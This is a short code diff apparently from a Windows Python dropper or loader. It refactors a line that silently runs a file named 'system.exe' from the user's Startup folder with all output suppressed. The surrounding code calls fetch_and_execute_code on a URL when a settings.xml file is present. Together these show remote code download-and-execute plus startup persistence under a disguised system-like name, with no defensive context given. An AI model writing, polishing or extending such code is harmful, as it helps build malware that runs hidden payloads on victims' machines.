@@ -137,7 +137,8 @@ def main():
     if(check_file("settings.xml")):
         fetch_and_execute_code(url)
     else:
-        subprocess.Popen(f'"{get_startup_folders()["User Startup"]}\system.exe"', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
+        user_startup_folder = get_startup_folders()["User Startup"]
+        system_exe_path = os.path.join(user_startup_folder, "system.exe")
+        subprocess.Popen(f'"{system_exe_path}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 if __name__ == "__main__":
     main()
